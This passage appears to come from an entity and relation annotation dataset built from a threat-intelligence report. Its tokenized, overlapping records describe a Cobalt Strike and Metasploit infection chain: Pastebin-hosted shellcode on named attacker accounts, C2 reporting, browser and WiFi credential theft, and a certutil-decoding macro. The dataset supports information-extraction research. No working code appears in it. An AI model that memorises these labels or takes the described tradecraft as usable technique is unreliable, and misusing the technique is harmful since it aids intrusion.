"\\sysnative\\dllhost.exe", "injection", "configuration", "=ntdll", ":", "RtlUserThreadStartCreateThreadNtQueueApc", "Cobalt", "Strike", "beacons", "used", "in", "this", "attack", "support", "a", "wide", "variety", "of", "capabilities", "(", "also", "known", "as", "commands", ")", "including", ":", "Execution", "of", "arbitrary", "code", "in", "target", "processes", "via", "injection", "."], ["Execution", "of", "arbitrary", "commands", "on", "the", "infected", "endpoint", "."], ["Download", "and", "upload", "files", "."], ["Enumerate", ",", "copy", ",", "delete", ",", "timestomp", "files", "."], ["Modify", ",", "query", "the", "Windows", "registry", "."], ["The", "overall", "infection", "chain", "is", "illustrated", "as", "follows", ":", "Pastebin", "usage", ":", "This", "attack", "utilizes", "pastebin.com", "extensively", "to", "host", "the", "Metasploit", "downloader", "shellcode", "(", "Stage", "2A", ")", "."], ["The", "shellcode", "hosted", "on", "pastebin", "is", "either", "created", "through", "a", "guest", "account", "or", "owned", "by", "five", "registered", "accounts", ",", "specifically", ":", "hxxps", ":", "//pastebin.com/u/r_ajeevshikra", "hxxps:", "//pastebin.com/u/ra_jeevshikra", "hxxps:", "//pastebin.com/u/raj_eevshikra", "hxxps:", "//pastebin.com/u/raje_evshikrahxxps", ":", "//pastebin.com/u/rajeev_shikraPastebin", "account", "operated", "by", "the", "attacker", ":", "The", "base64-encoded", "Metasploit", "downloader", "shellcode", "(", "Stage", "2A", ")", "hosted", "on", "Pastebin", "."], ["Two", "python", "modules", "discovered", "served", "the", "following", "purposes", ":", "Gather", "initial", "system", "information", "and", "send", "it", "to", "the", "C2", "server", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [22, 22], "name": "beacons", "pos": [22, 23], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [26, 26], "name": "attack", "pos": [26, 27], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [32, 32], "name": "capabilities", "pos": [32, 33], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [43, 43], "name": "arbitrary code", "pos": [43, 45], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [53, 53], "name": "arbitrary commands", "pos": [2, 4], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [58, 58], "name": "endpoint", "pos": [7, 8], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [63, 63], "name": "files", "pos": [3, 4], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [72, 72], "name": "files", "pos": [7, 8], "index": "7_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [79, 79], "name": "registry", "pos": [5, 6], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [83, 83], "name": "infection chain", "pos": [2, 4], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [94, 94], "name": "attack", "pos": [13, 14], "index": "10_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [96, 96], "name": "pastebin.com", "pos": [15, 16], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [102, 102], "name": "downloader shellcode", "pos": [21, 23], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [110, 110], "name": "shellcode", "pos": [1, 2], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [145, 145], "name": "attacker", "pos": [36, 37], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [151, 151], "name": "shellcode", "pos": [42, 43], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [162, 162], "name": "modules", "pos": [2, 3], "index": "16_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [171, 171], "name": "system information", "pos": [11, 13], "index": "17_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [179, 179], "name": "server", "pos": [19, 20], "index": "18_0"}]], "labels": [{"r": "FR", "evidence": [0], "t": 0, "h": 1}, {"r": "FR", "evidence": [0], "h": 1, "t": 2}, {"r": "EX", "evidence": [0], "h": 1, "t": 3}, {"r": "ST", "evidence": [0, 1], "h": 2, "t": 5}, {"r": "RF", "evidence": [0, 1], "h": 2, "t": 5}, {"r": "WR", "evidence": [0, 1, 2], "h": 2, "t": 6}, {"r": "RD", "evidence": [0, 1, 2, 3], "h": 2, "t": 7}, {"r": "WR", "evidence": [0, 1, 2, 3], "h": 2, "t": 7}, {"r": "UK", "evidence": [0, 1, 2, 3], "h": 2, "t": 7}, {"r": "RD", "evidence": [0, 1, 2, 3, 4], "h": 2, "t": 8}, {"r": "RD", "evidence": [0, 1, 2, 3, 4], "h": 2, "t": 8}, {"r": "WR", "evidence": [0, 1, 2, 3, 4], "h": 2, "t": 8}, {"r": "CO", "evidence": [0, 1], "h": 3, "t": 4}, {"r": "ST", "evidence": [1, 2, 3, 4, 5], "t": 5, "h": 9}, {"r": "RF", "evidence": [1, 2, 3, 4, 5], "t": 5, "h": 9}, {"r": "FR", "evidence": [5], "h": 9, "t": 10}, {"r": "ST", "evidence": [5], "h": 10, "t": 11}, {"r": "RF", "evidence": [5], "h": 10, "t": 11}, {"r": "RD", "evidence": [5], "h": 10, "t": 12}, {"r": "FR", "evidence": [5, 6, 7], "h": 9, "t": 16}, {"r": "RD", "evidence": [6], "h": 14, "t": 15}, {"r": "CO", "evidence": [6], "h": 13, "t": 15}, {"r": "RD", "evidence": [7], "h": 16, "t": 17}, {"r": "ST", "evidence": [7], "h": 16, "t": 18}, {"r": "RF", "evidence": [7], "h": 16, "t": 18}]}, {"title": "643-44", "sents": [["Execution", "of", "arbitrary", "commands", "on", "the", "infected", "endpoint", "."], ["Download", "and", "upload", "files", "."], ["Enumerate", ",", "copy", ",", "delete", ",", "timestomp", "files", "."], ["Modify", ",", "query", "the", "Windows", "registry", "."], ["The", "overall", "infection", "chain", "is", "illustrated", "as", "follows", ":", "Pastebin", "usage", ":", "This", "attack", "utilizes", "pastebin.com", "extensively", "to", "host", "the", "Metasploit", "downloader", "shellcode", "(", "Stage", "2A", ")", "."], ["The", "shellcode", "hosted", "on", "pastebin", "is", "either", "created", "through", "a", "guest", "account", "or", "owned", "by", "five", "registered", "accounts", ",", "specifically", ":", "hxxps", ":", "//pastebin.com/u/r_ajeevshikra", "hxxps:", "//pastebin.com/u/ra_jeevshikra", "hxxps:", "//pastebin.com/u/raj_eevshikra", "hxxps:", "//pastebin.com/u/raje_evshikrahxxps", ":", "//pastebin.com/u/rajeev_shikraPastebin", "account", "operated", "by", "the", "attacker", ":", "The", "base64-encoded", "Metasploit", "downloader", "shellcode", "(", "Stage", "2A", ")", "hosted", "on", "Pastebin", "."], ["Two", "python", "modules", "discovered", "served", "the", "following", "purposes", ":", "Gather", "initial", "system", "information", "and", "send", "it", "to", "the", "C2", "server", "."], ["Sysinfo", "gathering", "capabilities", "of", "the", "Python", "modules", ":", "Credentials", "stolen", "from", "the", "endpoint", "by", "the", "other", "python", "module", "were", "from", ":", "Google", "ChromeMicrosoft", "EdgeOperaMozilla", "FirefoxWiFi", "credentialsCredential-stealing", "module", "of", "the", "attack", "(", "snip", ")", ":", "Evolution", "of", "attacksTalos", "discovered", "multiple", "variants", "of", "the", "attack", "instrumenting", "the", "Metasploit", "shellcode", "and", "ultimately", "activating", "the", "final", "payload", "(", "Cobalt", "Strike", "beacons", ")", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "arbitrary commands", "pos": [2, 4], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [7, 7], "name": "endpoint", "pos": [7, 8], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [12, 12], "name": "files", "pos": [3, 4], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [21, 21], "name": "files", "pos": [7, 8], "index": "3_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [28, 28], "name": "registry", "pos": [5, 6], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [32, 32], "name": "infection chain", "pos": [2, 4], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [43, 43], "name": "attack", "pos": [13, 14], "index": "6_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [45, 45], "name": "pastebin.com", "pos": [15, 16], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [51, 51], "name": "downloader shellcode", "pos": [21, 23], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [59, 59], "name": "shellcode", "pos": [1, 2], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [94, 94], "name": "attacker", "pos": [36, 37], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [100, 100], "name": "shellcode", "pos": [42, 43], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [111, 111], "name": "modules", "pos": [2, 3], "index": "12_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [120, 120], "name": "system information", "pos": [11, 13], "index": "13_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [128, 128], "name": "server", "pos": [19, 20], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [136, 136], "name": "modules", "pos": [6, 7], "index": "15_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [138, 138], "name": "Credentials", "pos": [8, 9], "index": "16_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [142, 142], "name": "endpoint", "pos": [12, 13], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [172, 172], "name": "attack", "pos": [42, 43], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [176, 176], "name": "shellcode", "pos": [46, 47], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [182, 182], "name": "payload", "pos": [52, 53], "index": "20_0"}]], "labels": [{"r": "ST", "evidence": [0, 1, 2, 3, 4], "t": 1, "h": 5}, {"r": "RF", "evidence": [0, 1, 2, 3, 4], "t": 1, "h": 5}, {"r": "FR", "evidence": [4], "h": 5, "t": 6}, {"r": "ST", "evidence": [4], "h": 6, "t": 7}, {"r": "RF", "evidence": [4], "h": 6, "t": 7}, {"r": "RD", "evidence": [4], "h": 6, "t": 8}, {"r": "FR", "evidence": [4, 5, 6], "h": 5, "t": 12}, {"r": "FR", "evidence": [4, 5, 6, 7], "h": 5, "t": 15}, {"r": "RD", "evidence": [5], "h": 10, "t": 11}, {"r": "CO", "evidence": [5], "h": 9, "t": 11}, {"r": "RD", "evidence": [6], "h": 12, "t": 13}, {"r": "ST", "evidence": [6], "h": 12, "t": 14}, {"r": "RF", "evidence": [6], "h": 12, "t": 14}, {"r": "RD", "evidence": [7], "h": 15, "t": 16}, {"r": "ST", "evidence": [7], "h": 15, "t": 17}, {"r": "RF", "evidence": [7], "h": 15, "t": 17}, {"r": "FR", "evidence": [7], "h": 15, "t": 18}, {"r": "RD", "evidence": [7], "h": 18, "t": 19}, {"r": "EX", "evidence": [7], "h": 18, "t": 20}]}, {"title": "643-45", "sents": [["Download", "and", "upload", "files", "."], ["Enumerate", ",", "copy", ",", "delete", ",", "timestomp", "files", "."], ["Modify", ",", "query", "the", "Windows", "registry", "."], ["The", "overall", "infection", "chain", "is", "illustrated", "as", "follows", ":", "Pastebin", "usage", ":", "This", "attack", "utilizes", "pastebin.com", "extensively", "to", "host", "the", "Metasploit", "downloader", "shellcode", "(", "Stage", "2A", ")", "."], ["The", "shellcode", "hosted", "on", "pastebin", "is", "either", "created", "through", "a", "guest", "account", "or", "owned", "by", "five", "registered", "accounts", ",", "specifically", ":", "hxxps", ":", "//pastebin.com/u/r_ajeevshikra", "hxxps:", "//pastebin.com/u/ra_jeevshikra", "hxxps:", "//pastebin.com/u/raj_eevshikra", "hxxps:", "//pastebin.com/u/raje_evshikrahxxps", ":", "//pastebin.com/u/rajeev_shikraPastebin", "account", "operated", "by", "the", "attacker", ":", "The", "base64-encoded", "Metasploit", "downloader", "shellcode", "(", "Stage", "2A", ")", "hosted", "on", "Pastebin", "."], ["Two", "python", "modules", "discovered", "served", "the", "following", "purposes", ":", "Gather", "initial", "system", "information", "and", "send", "it", "to", "the", "C2", "server", "."], ["Sysinfo", "gathering", "capabilities", "of", "the", "Python", "modules", ":", "Credentials", "stolen", "from", "the", "endpoint", "by", "the", "other", "python", "module", "were", "from", ":", "Google", "ChromeMicrosoft", "EdgeOperaMozilla", "FirefoxWiFi", "credentialsCredential-stealing", "module", "of", "the", "attack", "(", "snip", ")", ":", "Evolution", "of", "attacksTalos", "discovered", "multiple", "variants", "of", "the", "attack", "instrumenting", "the", "Metasploit", "shellcode", "and", "ultimately", "activating", "the", "final", "payload", "(", "Cobalt", "Strike", "beacons", ")", "."], ["The", "threat", "also", "begins", "with", "a", "maldoc", "containing", "a", "malicious", "macro", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [3, 3], "name": "files", "pos": [3, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [12, 12], "name": "files", "pos": [7, 8], "index": "1_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [19, 19], "name": "registry", "pos": [5, 6], "index": "2_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [23, 23], "name": "infection chain", "pos": [2, 4], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [34, 34], "name": "attack", "pos": [13, 14], "index": "4_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [36, 36], "name": "pastebin.com", "pos": [15, 16], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [42, 42], "name": "downloader shellcode", "pos": [21, 23], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [50, 50], "name": "shellcode", "pos": [1, 2], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [85, 85], "name": "attacker", "pos": [36, 37], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [91, 91], "name": "shellcode", "pos": [42, 43], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [102, 102], "name": "modules", "pos": [2, 3], "index": "10_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [111, 111], "name": "system information", "pos": [11, 13], "index": "11_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [119, 119], "name": "server", "pos": [19, 20], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [127, 127], "name": "modules", "pos": [6, 7], "index": "13_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [129, 129], "name": "Credentials", "pos": [8, 9], "index": "14_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [133, 133], "name": "endpoint", "pos": [12, 13], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [163, 163], "name": "attack", "pos": [42, 43], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [167, 167], "name": "shellcode", "pos": [46, 47], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [173, 173], "name": "payload", "pos": [52, 53], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [181, 181], "name": "threat", "pos": [1, 2], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [186, 186], "name": "maldoc", "pos": [6, 7], "index": "20_0"}]], "labels": [{"r": "FR", "evidence": [3], "h": 3, "t": 4}, {"r": "ST", "evidence": [3], "h": 4, "t": 5}, {"r": "RF", "evidence": [3], "h": 4, "t": 5}, {"r": "RD", "evidence": [3], "h": 4, "t": 6}, {"r": "FR", "evidence": [3, 4, 5], "h": 3, "t": 10}, {"r": "FR", "evidence": [3, 4, 5, 6], "h": 3, "t": 13}, {"r": "RD", "evidence": [4], "h": 8, "t": 9}, {"r": "CO", "evidence": [4], "h": 7, "t": 9}, {"r": "RD", "evidence": [5], "h": 10, "t": 11}, {"r": "ST", "evidence": [5], "h": 10, "t": 12}, {"r": "RF", "evidence": [5], "h": 10, "t": 12}, {"r": "RD", "evidence": [6], "h": 13, "t": 14}, {"r": "ST", "evidence": [6], "h": 13, "t": 15}, {"r": "RF", "evidence": [6], "h": 13, "t": 15}, {"r": "FR", "evidence": [6], "h": 13, "t": 16}, {"r": "RD", "evidence": [6], "h": 16, "t": 17}, {"r": "EX", "evidence": [6], "h": 16, "t": 18}, {"r": "RD", "evidence": [7], "h": 19, "t": 20}]}, {"title": "643-46", "sents": [["Enumerate", ",", "copy", ",", "delete", ",", "timestomp", "files", "."], ["Modify", ",", "query", "the", "Windows", "registry", "."], ["The", "overall", "infection", "chain", "is", "illustrated", "as", "follows", ":", "Pastebin", "usage", ":", "This", "attack", "utilizes", "pastebin.com", "extensively", "to", "host", "the", "Metasploit", "downloader", "shellcode", "(", "Stage", "2A", ")", "."], ["The", "shellcode", "hosted", "on", "pastebin", "is", "either", "created", "through", "a", "guest", "account", "or", "owned", "by", "five", "registered", "accounts", ",", "specifically", ":", "hxxps", ":", "//pastebin.com/u/r_ajeevshikra", "hxxps:", "//pastebin.com/u/ra_jeevshikra", "hxxps:", "//pastebin.com/u/raj_eevshikra", "hxxps:", "//pastebin.com/u/raje_evshikrahxxps", ":", "//pastebin.com/u/rajeev_shikraPastebin", "account", "operated", "by", "the", "attacker", ":", "The", "base64-encoded", "Metasploit", "downloader", "shellcode", "(", "Stage", "2A", ")", "hosted", "on", "Pastebin", "."], ["Two", "python", "modules", "discovered", "served", "the", "following", "purposes", ":", "Gather", "initial", "system", "information", "and", "send", "it", "to", "the", "C2", "server", "."], ["Sysinfo", "gathering", "capabilities", "of", "the", "Python", "modules", ":", "Credentials", "stolen", "from", "the", "endpoint", "by", "the", "other", "python", "module", "were", "from", ":", "Google", "ChromeMicrosoft", "EdgeOperaMozilla", "FirefoxWiFi", "credentialsCredential-stealing", "module", "of", "the", "attack", "(", "snip", ")", ":", "Evolution", "of", "attacksTalos", "discovered", "multiple", "variants", "of", "the", "attack", "instrumenting", "the", "Metasploit", "shellcode", "and", "ultimately", "activating", "the", "final", "payload", "(", "Cobalt", "Strike", "beacons", ")", "."], ["The", "threat", "also", "begins", "with", "a", "maldoc", "containing", "a", "malicious", "macro", "."], ["The", "payload", "dropped", "to", "disk", "is", "a", "``", ".crt", "''", "file", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "files", "pos": [7, 8], "index": "0_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [14, 14], "name": "registry", "pos": [5, 6], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [18, 18], "name": "infection chain", "pos": [2, 4], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [29, 29], "name": "attack", "pos": [13, 14], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [31, 31], "name": "pastebin.com", "pos": [15, 16], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [37, 37], "name": "downloader shellcode", "pos": [21, 23], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [45, 45], "name": "shellcode", "pos": [1, 2], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [80, 80], "name": "attacker", "pos": [36, 37], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [86, 86], "name": "shellcode", "pos": [42, 43], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [97, 97], "name": "modules", "pos": [2, 3], "index": "9_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [106, 106], "name": "system information", "pos": [11, 13], "index": "10_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [114, 114], "name": "server", "pos": [19, 20], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [122, 122], "name": "modules", "pos": [6, 7], "index": "12_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [124, 124], "name": "Credentials", "pos": [8, 9], "index": "13_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [128, 128], "name": "endpoint", "pos": [12, 13], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [158, 158], "name": "attack", "pos": [42, 43], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [162, 162], "name": "shellcode", "pos": [46, 47], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [168, 168], "name": "payload", "pos": [52, 53], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [176, 176], "name": "threat", "pos": [1, 2], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [181, 181], "name": "maldoc", "pos": [6, 7], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [188, 188], "name": "payload", "pos": [1, 2], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [195, 195], "name": ".crt", "pos": [8, 9], "index": "21_0"}]], "labels": [{"r": "FR", "evidence": [2], "h": 2, "t": 3}, {"r": "ST", "evidence": [2], "h": 3, "t": 4}, {"r": "RF", "evidence": [2], "h": 3, "t": 4}, {"r": "RD", "evidence": [2], "h": 3, "t": 5}, {"r": "FR", "evidence": [2, 3, 4], "h": 2, "t": 9}, {"r": "FR", "evidence": [2, 3, 4, 5], "h": 2, "t": 12}, {"r": "RD", "evidence": [3], "h": 7, "t": 8}, {"r": "CO", "evidence": [3], "h": 6, "t": 8}, {"r": "RD", "evidence": [4], "h": 9, "t": 10}, {"r": "ST", "evidence": [4], "h": 9, "t": 11}, {"r": "RF", "evidence": [4], "h": 9, "t": 11}, {"r": "RD", "evidence": [5], "h": 12, "t": 13}, {"r": "ST", "evidence": [5], "h": 12, "t": 14}, {"r": "RF", "evidence": [5], "h": 12, "t": 14}, {"r": "FR", "evidence": [5], "h": 12, "t": 15}, {"r": "RD", "evidence": [5], "h": 15, "t": 16}, {"r": "EX", "evidence": [5], "h": 15, "t": 17}, {"r": "RD", "evidence": [6], "h": 18, "t": 19}, {"r": "CO", "evidence": [7], "h": 20, "t": 21}]}, {"title": "643-47", "sents": [["Modify", ",", "query", "the", "Windows", "registry", "."], ["The", "overall", "infection", "chain", "is", "illustrated", "as", "follows", ":", "Pastebin", "usage", ":", "This", "attack", "utilizes", "pastebin.com", "extensively", "to", "host", "the", "Metasploit", "downloader", "shellcode", "(", "Stage", "2A", ")", "."], ["The", "shellcode", "hosted", "on", "pastebin", "is", "either", "created", "through", "a", "guest", "account", "or", "owned", "by", "five", "registered", "accounts", ",", "specifically", ":", "hxxps", ":", "//pastebin.com/u/r_ajeevshikra", "hxxps:", "//pastebin.com/u/ra_jeevshikra", "hxxps:", "//pastebin.com/u/raj_eevshikra", "hxxps:", "//pastebin.com/u/raje_evshikrahxxps", ":", "//pastebin.com/u/rajeev_shikraPastebin", "account", "operated", "by", "the", "attacker", ":", "The", "base64-encoded", "Metasploit", "downloader", "shellcode", "(", "Stage", "2A", ")", "hosted", "on", "Pastebin", "."], ["Two", "python", "modules", "discovered", "served", "the", "following", "purposes", ":", "Gather", "initial", "system", "information", "and", "send", "it", "to", "the", "C2", "server", "."], ["Sysinfo", "gathering", "capabilities", "of", "the", "Python", "modules", ":", "Credentials", "stolen", "from", "the", "endpoint", "by", "the", "other", "python", "module", "were", "from", ":", "Google", "ChromeMicrosoft", "EdgeOperaMozilla", "FirefoxWiFi", "credentialsCredential-stealing", "module", "of", "the", "attack", "(", "snip", ")", ":", "Evolution", "of", "attacksTalos", "discovered", "multiple", "variants", "of", "the", "attack", "instrumenting", "the", "Metasploit", "shellcode", "and", "ultimately", "activating", "the", "final", "payload", "(", "Cobalt", "Strike", "beacons", ")", "."], ["The", "threat", "also", "begins", "with", "a", "maldoc", "containing", "a", "malicious", "macro", "."], ["The", "payload", "dropped", "to", "disk", "is", "a", "``", ".crt", "''", "file", "."], ["This", "file", "is", "decoded", "by", "the", "malicious", "macro", "using", "certutil", "'", "to", "obtain", "the", "next", "stage", "payload", "binary", "(", "EXE", ")", "which", "is", "then", "executed", "on", "the", "target", "endpoint", "."]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [5, 5], "name": "registry", "pos": [5, 6], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [9, 9], "name": "infection chain", "pos": [2, 4], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "attack", "pos": [13, 14], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [22, 22], "name": "pastebin.com", "pos": [15, 16], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "downloader shellcode", "pos": [21, 23], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [36, 36], "name": "shellcode", "pos": [1, 2], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [71, 71], "name": "attacker", "pos": [36, 37], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [77, 77], "name": "shellcode", "pos": [42, 43], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [88, 88], "name": "modules", "pos": [2, 3], "index": "8_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [97, 97], "name": "system information", "pos": [11, 13], "index": "9_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [105, 105], "name": "server", "pos": [19, 20], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [113, 113], "name": "modules", "pos": [6, 7], "index": "11_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [115, 115], "name": "Credentials", "pos": [8, 9], "index": "12_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [119, 119], "name": "endpoint", "pos": [12, 13], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [149, 149], "name": "attack", "pos": [42, 43], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [153, 153], "name": "shellcode", "pos": [46, 47], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [159, 159], "name": "payload", "pos": [52, 53], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [167, 167], "name": "threat", "pos": [1, 2], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [172, 172], "name": "maldoc", "pos": [6, 7], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [179, 179], "name": "payload", "pos": [1, 2], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [186, 186], "name": ".crt", "pos": [8, 9], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [191, 191], "name": "file", "pos": [1, 2], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [197, 197], "name": "macro", "pos": [7, 8], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [199, 199], "name": "certutil", "pos": [9, 10], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [206, 206], "name": "payload binary", "pos": [16, 18], "index": "24_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [218, 218], "name": "endpoint", "pos": [28, 29], "index": "25_0"}]], "labels": [{"r": "FR", "evidence": [1], "h": 1, "t": 2}, {"r": "ST", "evidence": [1], "h": 2, "t": 3}, {"r": "RF", "evidence": [1], "h": 2, "t": 3}, {"r": "RD", "evidence": [1], "h": 2, "t": 4}, {"r": "FR", "evidence": [1, 2, 3], "h": 1, "t": 8}, {"r": "FR", "evidence": [1, 2, 3, 4], "h": 1, "t": 11}, {"r": "RD", "evidence": [2], "h": 6, "t": 7}, {"r": "CO", "evidence": [2], "h": 5, "t": 7}, {"r": "RD", "evidence": [3], "h": 8, "t": 9}, {"r": "ST", "evidence": [3], "h": 8, "t": 10}, {"r": "RF", "evidence": [3], "h": 8, "t": 10}, {"r": "RD", "evidence": [4], "h": 11, "t": 12}, {"r": "ST", "evidence": [4], "h": 11, "t": 13}, {"r": "RF", "evidence": [4], "h": 11, "t": 13}, {"r": "FR", "evidence": [4], "h": 11, "t": 14}, {"r": "RD", "evidence": [4], "h": 14, "t": 15}, {"r": "EX", "evidence": [4], "h": 14, "t": 16}, {"r": "RD", "evidence": [5], "h": 17, "t": 18}, {"r": "CO", "evidence": [6], "h": 19, "t": 20}, {"r": "FR", "evidence": [7], "h": 22, "t": 23}, {"r": "WR", "evidence": [7], "t": 21, "h": 23}, {"r": "WR", "evidence": [7], "h": 23, "t": 24}, {"r": "ST", "evidence": [7], "h": 23, "t": 25}, {"r": "RF", "evidence": [7], "h": 23, "t": 25}]}, {"title": "643-48", "sents": [["The", "overall", "infection", "chain", "is", "illustrated", "as", "follows", ":", "Pastebin", "usage", ":", "This", "attack", "utilizes", "pastebin.com", "extensively", "to", "host", "the", "Metasploit", "downloader", "shellcode", "(", "Stage", "2A", ")", "."], ["The", "shellcode", "hosted", "on", "pastebin", "is", "either", "created", "through", "a", "guest", "account", "or", "owned", "by", "five", "registered", "accounts", ",", "specifically", ":", "hxxps", ":", "//pastebin.com/u/r_ajeevshikra", "hxxps:", "//pastebin.com/u/ra_jeevshikra", "hxxps:", "//pastebin.com/u/raj_eevshikra", "hxxps:", "//pastebin.com/u/raje_evshikrahxxps", ":", "//pastebin.com/u/rajeev_shikraPastebin", "account", "operated", "by", "the", "attacker", ":", "The", "base64-encoded", "Metasploit", "downloader", "shellcode", "(", "Stage", "2A", ")", "hosted", "on", "Pastebin", "."], ["Two", "python", "modules", "discovered", "served", "the", "following", "purposes", ":", "Gather", "initial", "system", "information", "and", "send", "it", "to", "the", "C2", "server", "."], ["Sysinfo", "gathering", "capabilities", "of", "the", "Python", "modules", ":", "Credentials", "stolen", "from", "the", "endpoint", "by", "the", "other", "python", "module", "were", "from", ":", "Google", "ChromeMicrosoft", "EdgeOperaMozilla", "FirefoxWiFi", "credentialsCredential-stealing", "module", "of", "the", "attack", "(", "snip", ")", ":", "Evolution", "of", "attacksTalos", "discovered", "multiple", "variants", "of", "the", "attack", "instrumenting", "the", "Metasploit", "shellcode", "and", "ultimately", "activating", "the", "final", "payload", "(", 